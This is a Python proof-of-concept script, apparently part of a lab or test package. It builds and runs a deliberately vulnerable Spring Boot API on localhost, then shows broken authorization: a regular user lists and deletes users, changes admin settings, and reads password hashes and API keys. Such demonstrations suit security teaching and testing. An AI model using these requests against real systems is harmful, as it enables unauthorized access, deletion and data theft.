#!/usr/bin/env python3
"""
Proof of Concept Script for Vulnerable Java Spring Boot API
This script demonstrates authorization vulnerabilities in a Java REST API
"""

import json
import subprocess
import sys
import time
import os
import signal
import requests

SERVER_PID = None
SERVER_PORT = 8080
SERVER_URL = f"http://localhost:{SERVER_PORT}"

def log(status: str, msg: str, **extra):
    """Emit a structured JSON log line"""
    print(json.dumps({"status": status, "message": msg, **extra}))

def setup():
    """Install deps and start server"""
    global SERVER_PID
    
    log("info", "Building Java project")
    result = subprocess.run(
        ["mvn", "clean", "package", "-DskipTests"],
        cwd=os.path.dirname(__file__),
        capture_output=True,
        text=True
    )
    if result.returncode != 0:
        log("error", "Maven build failed", stderr=result.stderr[-500:])
        raise RuntimeError("Maven build failed")
    log("success", "Project built successfully")
    
    log("info", "Starting Java server")
    log_file = "/tmp/java-server.log"
    with open(log_file, "w") as f:
        proc = subprocess.Popen(
            ["mvn", "spring-boot:run"],
            cwd=os.path.dirname(__file__),
            stdout=f,
            stderr=subprocess.STDOUT
        )
    
    SERVER_PID = proc.pid
    with open("/tmp/java-server.pid", "w") as f:
        f.write(str(SERVER_PID))
    
    log("info", "Waiting for server to be ready", pid=SERVER_PID)
    for i in range(30):  # Java apps take longer to start
        if proc.poll() is not None:
            try:
                with open(log_file, "r") as f:
                    server_output = f.read()
                log("error", "Server process exited", exit_code=proc.returncode, output=server_output[-500:])
            except:
                pass
            raise RuntimeError(f"Server process exited with code {proc.returncode}")
        
        try:
            r = requests.get(SERVER_URL, timeout=2)
            if r.status_code == 200:
                log("success", "Server is ready")
                return
        except Exception as e:
            if i == 29:
                log("info", f"Server check failed: {e}")
            time.sleep(1)
    
    try:
        with open(log_file, "r") as f:
            server_output = f.read()
        if server_output:
            log("error", "Server startup log", output=server_output[-1000:])
    except:
        pass
    
    raise RuntimeError("Server failed to start within 30 seconds")

def cleanup():
    """Kill background processes"""
    global SERVER_PID
    try:
        if SERVER_PID:
            os.kill(SERVER_PID, signal.SIGTERM)
            # Also kill any Java processes
            subprocess.run(["pkill", "-f", "spring-boot:run"], capture_output=True)
            time.sleep(2)
    except:
        pass
    
    try:
        os.remove("/tmp/java-server.pid")
    except:
        pass
    
    try:
        os.remove("/tmp/java-server.log")
    except:
        pass

def exploit():
    """Execute the attack: demonstrate authorization vulnerabilities"""
    vulnerabilities_confirmed = []
    
    # Test 1: Login as regular user (alice)
    log("info", "Test 1: Login as regular user (alice)")
    try:
        response = requests.post(
            f"{SERVER_URL}/api/login",
            json={"username": "alice", "password": "alice123"},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code != 200:
            log("error", "Login failed", status_code=response.status_code, response=response.text)
            return False
        
        result = response.json()
        if "token" not in result:
            log("error", "Login failed - no token in response", response=result)
            return False
        
        alice_token = result["token"]
        log("success", "Logged in as alice", token=alice_token[:50] + "...")
    except Exception as e:
        log("error", f"Login failed: {e}")
        return False
    
    # Test 2: Regular user accessing admin endpoint (VULNERABLE)
    log("info", "Test 2: Regular User Accessing Admin Endpoint")
    try:
        response = requests.get(
            f"{SERVER_URL}/api/admin/users",
            headers={"Authorization": f"Bearer {alice_token}"},
            timeout=10
        )
        if response.status_code == 200:
            users = response.json().get("users", [])
            log("confirmed", "VULNERABILITY: Regular user can list all users", user_count=len(users))
            vulnerabilities_confirmed.append("Regular user can access admin endpoints")
        else:
            log("info", "Authorization check working", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Test 3: Regular user deleting users (VULNERABLE)
    log("info", "Test 3: Regular User Deleting Users")
    try:
        response = requests.delete(
            f"{SERVER_URL}/api/admin/users/2",
            headers={"Authorization": f"Bearer {alice_token}"},
            timeout=10
        )
        if response.status_code == 200:
            result = response.json()
            log("confirmed", "VULNERABILITY: Regular user can delete users", message=result.get("message"))
            vulnerabilities_confirmed.append("Regular user can delete users")
        else:
            log("info", "Authorization check working", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Test 4: Regular user updating system settings (VULNERABLE)
    log("info", "Test 4: Regular User Updating System Settings")
    try:
        response = requests.put(
            f"{SERVER_URL}/api/admin/settings",
            json={"setting": "maintenance_mode", "value": "true"},
            headers={"Authorization": f"Bearer {alice_token}", "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            result = response.json()
            log("confirmed", "VULNERABILITY: Regular user can update system settings", message=result.get("message"))
            vulnerabilities_confirmed.append("Regular user can update system settings")
        else:
            log("info", "Authorization check working", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Test 5: User modifying other user's settings (VULNERABLE)
    log("info", "Test 5: User Modifying Other User's Settings")
    try:
        response = requests.put(
            f"{SERVER_URL}/api/users/2/settings",
            json={"setting": "theme", "value": "dark"},
            headers={"Authorization": f"Bearer {alice_token}", "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            result = response.json()
            log("confirmed", "VULNERABILITY: User can modify other user's settings", message=result.get("message"))
            vulnerabilities_confirmed.append("User can modify other user's settings")
        else:
            log("info", "Ownership check working", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Test 6: Regular user moderating content (VULNERABLE)
    log("info", "Test 6: Regular User Moderating Content")
    try:
        response = requests.post(
            f"{SERVER_URL}/api/moderate",
            json={"contentId": "content123", "action": "approve"},
            headers={"Authorization": f"Bearer {alice_token}", "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            result = response.json()
            log("confirmed", "VULNERABILITY: Regular user can moderate content", message=result.get("message"))
            vulnerabilities_confirmed.append("Regular user can moderate content")
        else:
            log("info", "Role check working", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Test 7: Information disclosure (VULNERABLE)
    log("info", "Test 7: Information Disclosure")
    try:
        response = requests.get(
            f"{SERVER_URL}/api/users/2/details",
            headers={"Authorization": f"Bearer {alice_token}"},
            timeout=10
        )
        if response.status_code == 200:
            user_details = response.json()
            if user_details.get("passwordHash") or user_details.get("apiKey"):
                log("confirmed", "VULNERABILITY: Sensitive information exposed",
                    has_password_hash=bool(user_details.get("passwordHash")),
                    has_api_key=bool(user_details.get("apiKey")))
                vulnerabilities_confirmed.append("Sensitive information exposed")
            else:
                log("info", "Information disclosure prevented")
        else:
            log("info", "Access denied or user not found", status_code=response.status_code)
    except Exception as e:
        log("error", f"Request failed: {e}")
    
    # Summary
    log("info", "Summary", vulnerability_count=len(vulnerabilities_confirmed))
    for i, vuln in enumerate(vulnerabilities_confirmed, 1):
        log("confirmed", f"Vulnerability {i}: {vuln}")
    
    return len(vulnerabilities_confirmed) > 0

def validate(result) -> bool:
    """Check if vulnerabilities were confirmed"""
    return result

if __name__ == "__main__":
    try:
        setup()
        result = exploit()
        confirmed = validate(result)
    except Exception as e:
        log("error", str(e))
        import traceback
        traceback.print_exc()
        confirmed = False
    finally:
        cleanup()
    
    if confirmed:
        log("confirmed", "VULNERABILITIES CONFIRMED")
        sys.exit(0)
    else:
        log("failed", "VULNERABILITIES NOT CONFIRMED")
        sys.exit(1)
